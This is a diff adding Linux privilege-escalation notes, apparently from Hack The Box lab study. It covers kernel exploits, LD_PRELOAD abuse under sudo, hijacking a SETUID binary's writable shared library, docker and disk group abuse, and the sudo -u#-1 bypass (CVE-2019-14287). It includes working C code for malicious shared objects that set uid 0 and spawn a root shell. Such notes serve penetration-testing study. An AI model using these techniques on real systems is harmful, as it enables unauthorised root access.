@@ -391,6 +391,288 @@ Wait until `bin/bash` get the suid bit set. then boom.&#x20;
 _Root cron jobs may be stored in the root user's personal crontab, which is not readable by low-privileged users. In such cases, tools like **pspy** can be used to identify scheduled tasks by observing processes executed by root._
 {% endhint %}
 
+## Kernel Exploits&#x20;
+
+#### Identify kernel version&#x20;
+
+{% code overflow="wrap" %}
+```bash
+uname -a
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1852).png" alt=""><figcaption></figcaption></figure>
+
+#### Search for exploit in google&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1853).png" alt=""><figcaption></figcaption></figure>
+
+#### Exploit&#x20;
+
+{% code overflow="wrap" %}
+```bash
+gcc exploit.c -o exploit
+./exploit
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1851).png" alt=""><figcaption></figcaption></figure>
+
+## Shared Libraries&#x20;
+
+### Understanding Shared Libraries&#x20;
+
+Linux programs often don't contain all their code. They load code from **shared libraries (.so files)**. For example when we execute ls it actually uses this shared libraries behind the scene:&#x20;
+
+{% code overflow="wrap" %}
+```bash
+/bin/ls
+        |
+        |----> libc.so.6
+        |
+        |----> libpthread.so
+        |
+        |----> libselinux.so
+```
+{% endcode %}
+
+Instead of copying the same code into every program, Linux loads it when the program starts.
+
+### Understanding LD\_PRELOAD
+
+**`LD_PRELOAD`** is an environment variable in Linux that tells the dynamic linker to **load your shared library (`.so`) before any other libraries**. This allows your library's functions to **override** the original library functions.
+
+#### Example
+
+Suppose a program calls `puts()` from `libc`.
+
+Normal execution:
+
+```
+Program → libc.so → puts()
+```
+
+With `LD_PRELOAD`:
+
+```
+Program → mylib.so → puts()  (overrides libc's puts)
+```
+
+Command:
+
+```
+LD_PRELOAD=./mylib.so ./program
+```
+
+{% hint style="danger" %}
+_If we're allowed to run any program or service as root, and the `LD_PRELOAD` environment variable is preserved for our user (for example, because the user is a developer or tester), we may be able to abuse it for privilege escalation._
+{% endhint %}
+
+### Identify external libraries usage
+
+{% code overflow="wrap" %}
+```bash
+ldd /bin/ls
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1854).png" alt=""><figcaption></figcaption></figure>
+
+### Escalation
+
+#### Identify whether we've access to an executable and LD\_PRELOAD variable&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo -l
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1855).png" alt=""><figcaption></figcaption></figure>
+
+#### Create Exploit&#x20;
+
+{% code overflow="wrap" %}
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1856).png" alt=""><figcaption></figcaption></figure>
+
+#### Escalate Privileges&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo LD_PRELOAD=/home/htb-student/root.so /usr/bin/openssl restart
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1857).png" alt=""><figcaption></figcaption></figure>
+
+## Shared Object Hijacking&#x20;
+
+**Scenario**
+
+A developer creates a SETUID root application that loads a custom library (`libshared.so`) from `/development`. The directory is mistakenly configured as world-writable (`777`). An attacker replaces the library with a malicious one implementing the expected function, causing the SETUID program to execute the attacker's code as **root**.
+
+#### 1. Identify the custom executable made&#x20;
+
+{% code overflow="wrap" %}
+```bash
+find / -type f -perm -u=s -exec ls -l {} \; 2> /dev/null
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1858).png" alt=""><figcaption></figcaption></figure>
+
+#### 2. Identify the shared libraries&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ldd /usr/local/bin/payroll
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1859).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_Thus the binary depends on custom library located at `/development/libshared.so`._&#x20;
+{% endhint %}
+
+#### 3. Check the library search path&#x20;
+
+{% code overflow="wrap" %}
+```bash
+readelf -d /usr/local/bin/payroll | grep PATH
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1860).png" alt=""><figcaption></figcaption></figure>
+
+Thus the binary is configured to load libraries from `/development`.&#x20;
+
+#### 4. Check whether the directory is writable&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ls -ld /development
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1861).png" alt=""><figcaption></figcaption></figure>
+
+#### 5. Identify the function that is implemented by libshared.so&#x20;
+
+{% hint style="info" %}
+_**Note:** To identify the function that `payroll` expects from `libshared.so`, simply remove or replace `libshared.so` with a valid shared library that does not contain the expected function, then run the binary. The resulting error message will reveal the missing function name._
+{% endhint %}
+
+{% code overflow="wrap" %}
+```c
+#include <stdio.h>
+
+void hello()
+{
+    printf("Hello");
+}
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1864).png" alt=""><figcaption></figcaption></figure>
+
+#### &#x20;6. Create malicious library (with the missing function name)
+
+{% code overflow="wrap" %}
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void dbquery()
+{
+    printf("[+] Malicious library loaded!\n");
+
+    setuid(0);
+    setgid(0);
+
+    system("/bin/sh -p");
+}
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+gcc -fPIC -shared src.c -o /development/libshared.so
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1862).png" alt=""><figcaption></figcaption></figure>
+
+#### 7. Escalate Privileges&#x20;
+
+{% code overflow="wrap" %}
+```bash
+/usr/local/bin/payroll
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1863).png" alt=""><figcaption></figcaption></figure>
+
+## Privileged Groups&#x20;
+
+### ADM <a href="#adm" id="adm"></a>
+
+Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
+
+```
+secaudit@NIX02:~$ id
+
+uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
+```
+
+### Disk <a href="#disk" id="disk"></a>
+
+Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
+
+### Docker <a href="#docker" id="docker"></a>
+
+Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
+
+<br>
+
+## Critical Sudo Vulnerability (CVE-2019-14287)
+
+A vulnerability affecting all `sudo` versions prior to **1.8.28** that allows a user to bypass the `!root` RunAs restriction and execute commands as **root**.
+
+**Example:**&#x20;
+
+```
+sudo -u#-1 /bin/bash
+```
+
+On a vulnerable system with a rule such as `(ALL, !root)`, the `-1` UID is interpreted as `0` (root), resulting in a root shell.
+
+
+
+
+
 ## Using Automated tools
 
 ### Using <kbd>Linux-Exploit-Suggester.sh</kbd>
